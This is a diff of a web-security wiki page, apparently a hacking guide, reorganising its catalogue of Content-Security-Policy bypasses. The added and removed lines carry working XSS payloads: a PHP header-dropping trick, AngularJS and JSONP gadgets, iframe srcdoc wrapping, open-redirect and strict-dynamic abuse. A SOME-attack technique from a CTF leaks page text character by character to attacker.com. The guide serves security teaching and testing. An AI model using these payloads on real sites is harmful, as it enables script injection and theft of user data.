@@ -59,17 +59,27 @@ Google's Content-Security-Policy evaluator showing potential issues
 
 ## Bypasses
 
-### Unset header (PHP)
+### Unset header
 
-[php.md](../../../languages/php.md "mention") has some tricks to completely remove the CSP header for a response that works in some edge cases, that would of course bypass any directives set.
+If you have control over some part of the CSP header or another header that is set before it, inserting _special characters_ may ignore the header.
 
-If the CSP header contains a `\n` it produces only **warning**, and ignores the whole header:
+[php.md](../../../languages/php.md "mention") specifically will produce a **warning** if the CSP header contains a `\n` (newline):
 
 > Header may not contain more than a single header, new line detected
 
-Another way that doesn't require any input into the header is somehow **sending content&#x20;**_**before**_ the [`header()`](https://www.php.net/manual/en/function.header.php) is set. This triggers the "**headers already sent**" warning and ignores the headers because in HTTP, headers must come before content.
+PHP has another trick to do with buffering. Without any input into the header, **sending body content&#x20;**_**before**_ the [`header()`](https://www.php.net/manual/en/function.header.php) is set may trigger the "**headers already sent**" warning and ignores all following headers. Because in HTTP, headers must come before content.
 
-In the Docker `php:apache` container, this is exploitable by default. Other configurations may also be, so it's worth a check if you encounter a PHP application (also goes for other security-relevant headers).
+In the Docker `php:apache` container, this is exploitable by default. By adding 1000 query parameters (`?x&x&x...`) to the URL, PHP will produce a warning even before the first line of source code is executed:
+
+{% code title="Response (?x&x&x...)" overflow="wrap" %}
+```html
+<b>Warning</b>: PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini.
+<br />
+<b>Warning</b>: Cannot modify header information - headers arleady sent
+```
+{% endcode %}
+
+Other configurations may also be, so it's worth a check if you encounter a PHP application (also goes for other security-relevant headers).
 
 [https://x.com/pilvar222/status/1784619224670797947](https://x.com/pilvar222/status/1784619224670797947)
 
@@ -97,6 +107,229 @@ These are separate directives and thus give more permissions, setting these to `
 
 &#x3C;script>alert(origin)&#x3C;/script>
 </code></pre>
+
+### Hosting JavaScript on `'self'`
+
+The URLs and `'self'` trust all scripts coming from that domain, meaning in a secure environment no user data should be stored under those domains, like uploaded JavaScript files. If this is allowed, an attacker can simply upload and host their payload on an allowed website and it is suddenly trusted by the CSP.&#x20;
+
+{% code title="/uploads/payload.js" %}
+```javascript
+alert()
+```
+{% endcode %}
+
+{% code title="Payload" %}
+```html
+<script src=/uploads/payload.js></script>
+```
+{% endcode %}
+
+For more complex scenarios where you cannot directly upload `.js` files, the `Content-Type:` header comes into play. The browser decides based on this header if the requested file is likely to be a real script, and if the type is `image/png` for example, it will simply refuse to execute it:
+
+<figure><img src="../../../.gitbook/assets/image (3) (5).png" alt="Refused to execute script from &#x27;http://localhost/uploads/image.png&#x27; because its MIME type (&#x27;image/png&#x27;) is not executable."><figcaption><p>Browser refusing to execute <code>image/png</code> file as JavaScript source</p></figcaption></figure>
+
+Some more ambiguous types are allowed, however, like `text/plain`, `text/html` or **no type at all**. These are especially useful as commonly a framework will decide what `Content-Type` to add based on the file extension, which may be empty in some cases causing it to choose a type allowed for JavaScript execution. This ambiguity is prevented however with an extra \
+`X-Content-Type-Options: nosniff` header that is sometimes set, making the detection from the browser a lot more strict and only allowing real `application/javascript` files ([full list](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc#50)).&#x20;
+
+An application may sanitize uploaded files by checking for a few signatures if it looks like a valid PNG, JPEG, GIF, etc. file which can limit exploitability as it still needs to be valid JavaScript code without `SyntaxError`s. In these cases, you can try to make a **"polyglot"** that passes the validation checks of the server, while remaining valid JavaScript by using the file format in a smart way and language features like comments to remove unwanted code.&#x20;
+
+Another idea instead of _storing_ data, is **reflecting** data. If there is any page that generates a response you can turn into valid JavaScript code, you may be able to abuse it for your payload. [JSONP](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) or other callback endpoints are also useful here as they always have the correct `Content-Type`, and may allow you to insert arbitrary code in place of the `?callback=` parameter, serving as your reflection of valid JavaScript code.
+
+### CDNs in `script-src`
+
+Every domain in `script-src` is trusted with all URLs it hosts. Often an allowed domain hosts much more than just the few scripts imported by the application. We can abuse that by finding known vulnerable libraries or use specific behavior of the allowed domain to return arbitrary scripts.\
+CDNs (Content Delivery Networks) are often used, and some tricks involving them will be shown below. Note however that the ideas apply to any other domain as well, as even if it's not well-known, you can find your own gadgets.
+
+#### Proxy domains
+
+CDNs have to host many different JavaScript files for libraries. Sometimes this is implemented by simply proxying every request to something like GitHub, where any user can create a repository and upload files. If an attacker would do this, and then reference their repository through the CDN, they could return arbitrary scripts.
+
+Examples include [unpkg.com](https://www.unpkg.com/) and [cdn.jsdelivr.com](https://cdn.jsdelivr.net) which host **every file on NPM**, you'll just have to publish your payload there. [`csp-bypass`](https://www.npmjs.com/package/csp-bypass) is one such existing payload that executes a dynamic payload in any `csp=` attribute on any tag you inject next to it:
+
+```html
+Content-Security-Policy: script-src https://unpkg.com
+
+<script src="https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js"></script>
+<br csp="alert(origin)">
+```
+
+#### Known libraries
+
+The [cdnjs.cloudflare.com](https://cdnjs.cloudflare.com) or [ajax.googleapis.com](https://ajax.googleapis.com/) domains host **only specific** popular libraries, which should be secure. Some older libraries still have exploitable features, however. The most well-known is **AngularJS**. This library searches for specific patterns in the DOM that can define event handlers without the regular inline syntax. This bypasses the CSP and can allow arbitrary JavaScript execution by loading such a library, and setting up your own malicious HTML content:
+
+{% code title="AngularJS CSP Bypass" overflow="wrap" %}
+```html
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
+<div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin)">
+```
+{% endcode %}
+
+#### JSONP
+
+Lastly, the allowed domain may dynamically generate scripts. This sounds strange but it is surprisingly common in a pattern called [JSONP](https://en.wikipedia.org/wiki/JSONP). To return data, scripts would call a callback function that handles it. This callback function is controlled via a query parameter, which we can set to any function we want to call.\
+If the function name isn't property sanitized, you can even insert whole XSS payloads in there like in the examples below:
+
+```html
+<script src="https://www.googleapis.com/customsearch/v1?callback=alert(origin)"></script>
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(origin)"></script>
+```
+
+***
+
+You can find lots of known gadgets on cspbypass.com:
+
+{% embed url="https://cspbypass.com/" %}
+Public list of Angular/JSONP gadgets for CSP Bypasses
+{% endembed %}
+
+See [#angularjs](content-security-policy-csp.md#angularjs "mention") for more complex AngularJS injections that bypass sanitizers. Also, note that other frameworks such as [#vuejs](content-security-policy-csp.md#vuejs "mention") or [#htmx](content-security-policy-csp.md#htmx "mention") may allow similar bypasses if they are accessible when `unsafe-eval` is set in the CSP.
+
+More **script gadgets** for different frameworks are shown in the presentation below. This includes:\
+Knockout, Ajaxify, Bootstrap, Google Closure, RequireJS, Ember, jQuery, jQuery Mobile, Dojo Toolkit, underscore, Aurelia, Polymer 1.x, AngularJS 1.x and Ractive.
+
+["Don't Trust the DOM: Bypassing XSS Mitigations via Script Gadgets"](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)
+
+{% embed url="https://github.com/google/security-research-pocs/blob/master/script-gadgets/bypasses.md" %}
+Table of bypasses and PoCs
+{% endembed %}
+
+Lastly, the following site collects more situational gadgets that abuse already loaded gargets on your target that you can trigger without even loading a new script.
+
+{% embed url="https://gmsgadget.com/" %}
+List of generic gadgets in common libraries, mostly focused on HTML
+{% endembed %}
+
+### `.innerHTML` not executing `<script>`
+
+One common problem is when you try to put a CSP bypass into a `.innerHTML` sink. The fact is the [`innerHTML` setter does not execute `<script>` tags](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations), by definition.
+
+<pre class="language-html"><code class="lang-html">&#x3C;body>&#x3C;/body>
+&#x3C;script>
+  // Doesn't work
+<strong>  document.body.innerHTML = "&#x3C;script>alert(origin)&#x3C;\/script>";
+</strong>&#x3C;/script>
+</code></pre>
+
+The solution for regular XSS is easy, just use anything other than a script tag such as an `onerror=` _event handler_:
+
+```javascript
+  // Works (but doesn't bypass CSP)
+  document.body.innerHTML = "<img src onerror=alert(origin)>";
+```
+
+But what if we **need** a `<script src>` tag to load the vulnerable CSP gadget?\
+`<iframe srcdoc>` comes to the rescue! **Wrapping your payload** **in `srcdoc=`** creates a new document, loading scripts again, which allows you to include any script gadgets ([source](https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/#self-script)). Note that you'll also need to put the rest of the HTML into this new document, otherwise AngularJS won't find it.
+
+{% code title="Working payload" overflow="wrap" %}
+```html
+<iframe srcdoc='
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
+  <div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin)">
+'></iframe>
+```
+{% endcode %}
+
+Afterward, if you want to grab anything from the top-level HTML just reference `parent.` or `top.`.
+
+{% hint style="warning" %}
+**Note**: `<script>` tags must always be closed using `</script>`, otherwise they don't execute either.
+{% endhint %}
+
+### Redirect to unrestricted path
+
+URLs in a CSP may have a path, not only a domain. The following example provides a full URL to `base64.min.js`, and you would expect only that script could be loaded from the `cdn.js.cloudflare.com` origin.
+
+{% code overflow="wrap" %}
+```http
+Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/Base64/1.3.0/base64.min.js
+```
+{% endcode %}
+
+This is not entirely true, however. If another origin, like `'self'` contains an **Open Redirect** vulnerability, you may redirect a script URL to any path on `cdnjs.cloudflare.com`!
+
+{% embed url="https://joaxcar.com/blog/2024/05/16/sandbox-iframe-xss-challenge-solution/" %}
+Challenge writeup involving CSP open redirect bypass
+{% endembed %}
+
+The following script would be allowed by the [CSP spec](https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects), note that the `angular.js` path is not normally allowed, but it is through the redirect because its origin is allowed. This can be abused with some HTML that executes arbitrary JavaScript, even if `'unsafe-eval'` is not set:
+
+<pre class="language-html" data-overflow="wrap"><code class="lang-html"><strong>&#x3C;script src="/redirect?url=https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fangular.js%2F1.8.3%2Fangular.min.js">&#x3C;/script>
+</strong>&#x3C;div ng-app>&#x3C;img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin)">
+</code></pre>
+
+### `strict-dynamic`
+
+The [`strict-dynamic`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#strict-dynamic) directive allows trusted scripts to insert untrusted scripts via [`document.createElement("script")`](https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement).
+
+An example where this is dangerous is the **jQuery** library whose [`.html()`](https://api.jquery.com/html/) method scans for `<script>` tags and evaluates their content. Not using the `eval()` function, but by inserting the content as a new script tag in `document.head`. The [`domManip()`](https://github.com/jquery/jquery/blob/ec738b3190a3b67d08f51451e1faa15f1f4bf916/src/manipulation/domManip.js#L98) function is responsible for this.\
+It means that any injection in jQuery can be exploited by simply providing an inline script instead of event handler:
+
+```http
+Content-Security-Policy: script-src 'nonce-NONCE' 'strict-dynamic'
+
+<script src="https://code.jquery.com/jquery-3.7.1.js" nonce="NONCE"></script>
+<body></body>
+<script nonce="NONCE">
+	$("body").html("<script>alert(origin)<\/script>")
+</script>
+```
+
+Many more libraries have different ways they include remote/inline scripts allowing you to bypass `strict-dynamic`. Check [https://gmsgadget.com/#csp:strict-dynamic](https://gmsgadget.com/#csp:strict-dynamic) for known gadgets.
+
+### SOME attack
+
+Not all callback parameters are equal. Most nowadays restrict the possible characters, so you should fuzz exactly what character are and aren't allowed.
+
+In case only `[a-zA-Z.]` is allowed, arbitrary JavaScript is not possible. However, you can still access certain elements through properties and then call methods like [`.click()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/click) to submit forms. Even on other pages through `opener`. This is called the SOME attack, with a generator below:
+
+{% embed url="https://someattack.com/Playground/About" %}
+
+***
+
+If _jQuery_ exists on the page and `$` & `_` are allowed (like in Express [`res.jsonp()`](https://expressjs.com/en/api.html#res.jsonp)), you can call [`$._evalUrl()`](https://github.com/jquery/jquery/blob/main/src/manipulation/_evalUrl.js) which evaluates the current page's content as JavaScript if there is no argument. It does so by **fetching the current** `location.href` and then putting its content in a `<script>` tag.\
+It can be useful when:
+
+1. You have a URL that returns valid JavaScript content, but with the wrong content type/nosniff
+2. The URL can be turned into a jQuery-enabled page, for example, by sending a POST request to receive an error page (without changing the URL)
+3. That page should have a more lax CSP that allows inline scripts or `strict-dynamic`
+
+Using the SOME page, you'll be able to call `opener.$._evalUrl` to make it fetch itself with a GET request, which returns some malicious content, and then gets executed.
+
+Note that this is a very specific technique where a lot of preconditions are required, but the same ideas may be able to be applied elsewhere.
+
+***
+
+With `[` & `]` characters allowed, and nesting of them (like in Express [`res.jsonp()`](https://expressjs.com/en/api.html#res.jsonp)), another really powerful primitive becomes available: variable member access. With this you can program a tiny bit of logic in JavaScript to not only call a function, but call different functions depending on certain conditions.
+
+One unintended solution by [@realansgar](https://bsky.app/profile/realansgar.dev) to the _idekCTF 2025 - jnotes_ challenge was using a limited HTML injection to create a list of anchor tags with unique IDs:
+
+```html
+<a id="a" href="https://attacker.com/a" target="top">
+<a id="b" href="https://attacker.com/b" target="top">
+<a id="c" href="https://attacker.com/c" target="top">
+...
+```
+
+Then, we can find some text we want to leak, and access it through common SOME techniques and `innerText` (note `children[42]` allows you to take some shortcuts). You can extract the first character of the text on the page you want to leak using `.innerText[0]`.\
+Now the trick is, we can access `window[...]` with the character returned from this, and if it matches any `id=` of the `<a>` tags we created, we will have a reference to that specific link. Finally, executing the `.click()` method on that will visit the link, leaking the first character.
+
+For example, let's say `body.children[0].textContent[0]` contains some sensitive information. We would inject all the anchor tags as above for all possible characters in this text, then add the following script tag to the exploit:
+
+{% code overflow="wrap" %}
+```python
+<script src="/jsonp?callback=window[top.opener.document.body.children[0].textContent[0]].click">
+```
+{% endcode %}
+
+This code will be evaluated as follows:
+
+1. `window[top.opener.document.body.children[0].textContent[0]].click()`
+2. `window['SECRET'[0]].click()`
+3. `window['S'].click()`
+4. `<a id="S" href="https://attacker.com/S">` is clicked
+5. Browser navigates to [https://attacker.com/S](https://attacker.com/S), first character is leaked to the attacker
+
+Then simply continue for `.innerText[1]`, `.innerText[2]`, etc. until the whole string is leaked.
 
 ### Exfiltrating with strict [`connect-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src)
 
@@ -157,174 +390,6 @@ Finally, we receive DNS requests on the `interactsh-client` that we can [decode]
 [jbswY3dpfqqHo33snrSccICiMvwGY3zMeB3w64TMMqqsaSdfNRwg6LBao5xxe3d.eEeqEqzLMnrxSyIdXn5ZGyZbBEBEGK3dmN4WcA53pojWGIijAjbsWy3dPfQqHO3.3SNrScCIciMVwgY3zMEB3W64tmmqqSASDfnrWG6LbaO5xXe3DeEeQa.CkJbCs2q8GudlQGiTungUCqgux7BFhahq] Received DNS interaction (A) from 74.125.114.204
 ```
 {% endcode %}
-
-### Hosting JavaScript on `'self'`
-
-The URLs and `'self'` trust all scripts coming from that domain, meaning in a secure environment no user data should be stored under those domains, like uploaded JavaScript files. If this is allowed, an attacker can simply upload and host their payload on an allowed website and it is suddenly trusted by the CSP.&#x20;
-
-{% code title="/uploads/payload.js" %}
-```javascript
-alert()
-```
-{% endcode %}
-
-{% code title="Payload" %}
-```html
-<script src=/uploads/payload.js></script>
-```
-{% endcode %}
-
-For more complex scenarios where you cannot directly upload `.js` files, the `Content-Type:` header comes into play. The browser decides based on this header if the requested file is likely to be a real script, and if the type is `image/png` for example, it will simply refuse to execute it:
-
-<figure><img src="../../../.gitbook/assets/image (3) (5).png" alt="Refused to execute script from &#x27;http://localhost/uploads/image.png&#x27; because its MIME type (&#x27;image/png&#x27;) is not executable."><figcaption><p>Browser refusing to execute <code>image/png</code> file as JavaScript source</p></figcaption></figure>
-
-Some more ambiguous types are allowed, however, like `text/plain`, `text/html` or **no type at all**. These are especially useful as commonly a framework will decide what `Content-Type` to add based on the file extension, which may be empty in some cases causing it to choose a type allowed for JavaScript execution. This ambiguity is prevented however with an extra \
-`X-Content-Type-Options: nosniff` header that is sometimes set, making the detection from the browser a lot more strict and only allowing real `application/javascript` files ([full list](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc#50)).&#x20;
-
-An application may sanitize uploaded files by checking for a few signatures if it looks like a valid PNG, JPEG, GIF, etc. file which can limit exploitability as it still needs to be valid JavaScript code without `SyntaxError`s. In these cases, you can try to make a **"polyglot"** that passes the validation checks of the server, while remaining valid JavaScript by using the file format in a smart way and language features like comments to remove unwanted code.&#x20;
-
-Another idea instead of _storing_ data, is **reflecting** data. If there is any page that generates a response you can turn into valid JavaScript code, you may be able to abuse it for your payload. [JSONP](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) or other callback endpoints are also useful here as they always have the correct `Content-Type`, and may allow you to insert arbitrary code in place of the `?callback=` parameter, serving as your reflection of valid JavaScript code.
-
-### SOME attack
-
-Not all callback parameters are equal. Most nowadays restrict the possible characters, so you should fuzz exactly what character are and aren't allowed.
-
-In case only `[a-zA-Z.]` is allowed, arbitrary JavaScript is not possible. However, you can still access certain elements through properties and then call methods like [`.click()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/click) to submit forms. Even on other pages through `opener`. This is called the SOME attack, with a generator below:
-
-{% embed url="https://someattack.com/Playground/About" %}
-
-***
-
-If _jQuery_ exists on the page and `$` & `_` are allowed (like in Express [`res.jsonp()`](https://expressjs.com/en/api.html#res.jsonp)), you can call [`$._evalUrl()`](https://github.com/jquery/jquery/blob/main/src/manipulation/_evalUrl.js) which evaluates the current page's content as JavaScript if there is no argument. It does so by **fetching the current** `location.href` and then putting its content in a `<script>` tag.\
-It can be useful when:
-
-1. You have a URL that returns valid JavaScript content, but with the wrong content type/nosniff
-2. The URL can be turned into a jQuery-enabled page, for example, by sending a POST request to receive an error page (without changing the URL)
-3. That page should have a more lax CSP that allows inline scripts or `strict-dynamic`
-
-Using the SOME page, you'll be able to call `opener.$._evalUrl` to make it fetch itself with a GET request, which returns some malicious content, and then gets executed.
-
-Note that this is a very specific technique where a lot of preconditions are required, but the same ideas may be able to be applied elsewhere.
-
-***
-
-With `[` & `]` characters allowed, and nesting of them (like in Express [`res.jsonp()`](https://expressjs.com/en/api.html#res.jsonp)), another really powerful primitive becomes available: variable member access. With this you can program a tiny bit of logic in JavaScript to not only call a function, but call different functions depending on certain conditions.
-
-One unintended solution by [@realansgar](https://bsky.app/profile/realansgar.dev) to the _idekCTF 2025 - jnotes_ challenge was using a limited HTML injection to create a list of anchor tags with unique IDs:
-
-```html
-<a id="a" href="https://attacker.com/a" target="top">
-<a id="b" href="https://attacker.com/b" target="top">
-<a id="c" href="https://attacker.com/c" target="top">
-...
-```
-
-Then, we can find some text we want to leak, and access it through common SOME techniques and `innerText` (note `children[42]` allows you to take some shortcuts). You can extract the first character of the text on the page you want to leak using `.innerText[0]`.\
-Now the trick is, we can access `window[...]` with the character returned from this, and if it matches any `id=` of the `<a>` tags we created, we will have a reference to that specific link. Finally, executing the `.click()` method on that will visit the link, leaking the first character.
-
-For example, let's say `body.children[0].textContent[0]` contains some sensitive information. We would inject all the anchor tags as above for all possible characters in this text, then add the following script tag to the exploit:
-
-{% code overflow="wrap" %}
-```python
-<script src="/jsonp?callback=window[top.opener.document.body.children[0].textContent[0]].click">
-```
-{% endcode %}
-
-This code will be evaluated as follows:
-
-1. `window[top.opener.document.body.children[0].textContent[0]].click()`
-2. `window['SECRET'[0]].click()`
-3. `window['S'].click()`
-4. `<a id="S" href="https://attacker.com/S">` is clicked
-5. Browser navigates to [https://attacker.com/S](https://attacker.com/S), first character is leaked to the attacker
-
-Then simply continue for `.innerText[1]`, `.innerText[2]`, etc. until the whole string is leaked.
-
-### CDNs in `script-src` (AngularJS Bypass + JSONP)
-
-Every origin in this directive is trusted with all URLs it hosts. A common addition here is CDN (Content Delivery Network) domains that host many different JavaScript files for libraries. While in very unrestricted situations a CDN like [unpkg.com](https://www.unpkg.com/) will host **every file on NPM**, even malicious ones, others are less obvious.
-
-The [cdnjs.cloudflare.com](https://cdnjs.cloudflare.com) or [ajax.googleapis.com](https://ajax.googleapis.com/) domains for example host **only specific** popular libraries which should be secure, but some have exploitable features. The most well-known is AngularJS, which a vulnerable site may also host themselves removing the need for a CDN. This library searches for specific patterns in the DOM that can define event handlers without the regular inline syntax. This bypasses the CSP and can allow arbitrary JavaScript execution by loading such a library, and including your own malicious content in the DOM:
-
-<pre class="language-html"><code class="lang-html">&#x3C;!-- *.googleapis.com -->
-<strong>&#x3C;script src="https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)">&#x3C;/script>
-</strong>&#x3C;!-- *.google.com -->
-<strong>&#x3C;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)">&#x3C;/script>
-</strong>&#x3C;!-- ajax.googleapis.com (click) + maps.googleapis.com (no click) -->
-<strong>&#x3C;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js>&#x3C;/script>
-</strong><strong>&#x3C;div ng-app ng-csp id=x ng-click=$event.view.alert($event.view.document.domain)>&#x3C;/div>
-</strong><strong>&#x3C;script async src=https://maps.googleapis.com/maps/api/js?callback=x.click>&#x3C;/script>
-</strong>&#x3C;!-- cdnjs.cloudflare.com -->
-<strong>&#x3C;script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js">&#x3C;/script>
-</strong><strong>&#x3C;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js">&#x3C;/script>
-</strong><strong>&#x3C;div ng-app ng-csp>{{$on.curry.call().alert($on.curry.call().document.domain)}}&#x3C;/div>
-</strong></code></pre>
-
-Loading any of these blocks in a CSP that allows it, will trigger the `alert(document.domain)` function. A common pattern for finding these bypasses is using Angular to create an environment where code can be executed from **event handlers**, and then another library or callback function to **click** on the element, triggering the handler with your malicious code.
-
-See [jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) for a not-so-updated list of public JSONP endpoints you may find useful.
-
-{% embed url="https://cspbypass.com/" %}
-Public list of Angular/JSONP gadgets for CSP Bypasses
-{% endembed %}
-
-See [#angularjs](content-security-policy-csp.md#angularjs "mention") for more complex AngularJS injections that bypass filters. Also, note that other frameworks such as [#vuejs](content-security-policy-csp.md#vuejs "mention") or [#htmx](content-security-policy-csp.md#htmx "mention") may allow similar bypasses if they are accessible when `unsafe-eval` is set in the CSP.
-
-More **script gadgets** for different frameworks are shown in the presentation below. This includes:\
-Knockout, Ajaxify, Bootstrap, Google Closure, RequireJS, Ember, jQuery, jQuery Mobile, Dojo Toolkit, underscore, Aurelia, Polymer 1.x, AngularJS 1.x and Ractive.
-
-["Don't Trust the DOM: Bypassing XSS Mitigations via Script Gadgets"](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)
-
-{% embed url="https://github.com/google/security-research-pocs/blob/master/script-gadgets/bypasses.md" %}
-Table of bypasses and PoCs
-{% endembed %}
-
-The following site collects more general script gadgets in various libraries that companies may host:
-
-{% embed url="https://gmsgadget.com/" %}
-List of generic gadgets in common libraries, mostly focused on HTML
-{% endembed %}
-
-### `strict-dynamic`
-
-The [`strict-dynamic`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#strict-dynamic) directive allows trusted scripts to insert untrusted scripts via [`document.createElement("script")`](https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement).
-
-An example where this is dangerous is the **jQuery** library whose [`.html()`](https://api.jquery.com/html/) method scans for `<script>` tags and evaluates their content. Not using the `eval()` function, but by inserting the content as a new script tag in `document.head`. The [`domManip()`](https://github.com/jquery/jquery/blob/ec738b3190a3b67d08f51451e1faa15f1f4bf916/src/manipulation/domManip.js#L98) function is responsible for this.\
-It means that any injection in jQuery can be exploited by simply providing an inline script instead of event handler:
-
-```http
-Content-Security-Policy: script-src 'nonce-NONCE' 'strict-dynamic'
-
-<script src="https://code.jquery.com/jquery-3.7.1.js" nonce="NONCE"></script>
-<body></body>
-<script nonce="NONCE">
-	$("body").html("<script>alert(origin)<\/script>")
-</script>
-```
-
-Many more libraries have different ways they include remote/inline scripts allowing you to bypass `strict-dynamic`. Check [https://gmsgadget.com/#csp:strict-dynamic](https://gmsgadget.com/#csp:strict-dynamic) for known gadgets.
-
-### Redirect to unrestricted path
-
-URL's in a CSP may be absolute, not just an origin. The following example provides a full URL to `base64.min.js`, and you would expect only that script could be loaded from the `cdn.js.cloudflare.com` origin.
-
-{% code overflow="wrap" %}
-```http
-Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/Base64/1.3.0/base64.min.js
-```
-{% endcode %}
-
-This is not entirely true, however. If another origin, like `'self'` contains an **Open Redirect** vulnerability, you may redirect a script URL to any path on `cdnjs.cloudflare.com`!
-
-{% embed url="https://joaxcar.com/blog/2024/05/16/sandbox-iframe-xss-challenge-solution/" %}
-Challenge writeup involving CSP open redirect bypass
-{% endembed %}
-
-The following script would be allowed by the [CSP spec](https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects), note that the `angular.js` path is not normally allowed, but it is through the redirect because its origin is allowed. This can be abused with some HTML that executes arbitrary JavaScript, even if `'unsafe-eval'` is not set:
-
-<pre class="language-html" data-overflow="wrap"><code class="lang-html"><strong>&#x3C;script src="/redirect?url=https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fangular.js%2F1.8.3%2Fangular.min.js">&#x3C;/script>
-</strong>&#x3C;div ng-app>&#x3C;img src=x ng-on-error="$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.defaultView.origin)">&#x3C;/div>
-</code></pre>
 
 ### Nonce without `base-src`
 
